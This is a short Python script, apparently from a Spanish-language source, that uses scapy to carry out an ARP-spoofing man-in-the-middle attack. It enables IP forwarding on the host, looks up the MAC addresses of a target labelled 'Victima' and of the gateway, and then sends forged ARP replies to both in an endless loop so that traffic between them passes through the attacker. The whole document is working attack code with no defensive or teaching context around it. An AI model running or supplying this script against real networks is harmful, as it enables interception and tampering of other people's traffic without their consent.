from scapy.all import ARP, Ether, srp, send
import time
import os

target_ip = "10.0.0.20"     # Victima
gateway_ip = "10.0.0.1"     # Router


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    
    answered = srp(broadcast/arp_request, timeout=2, verbose=False)[0]
    
    return answered[0][1].hwsrc


def spoof(target_ip, target_mac, spoof_ip):
    packet = ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    send(packet, verbose=False)


print("[+] Activando IP Forwarding...")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)

print(f"[+] Victima MAC: {target_mac}")
print(f"[+] Gateway MAC: {gateway_mac}")

print("[+] Lanzando ataque MitM...")

try:
    while True:
        spoof(target_ip, target_mac, gateway_ip)
        spoof(gateway_ip, gateway_mac, target_ip)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[!] Deteniendo ataque...")
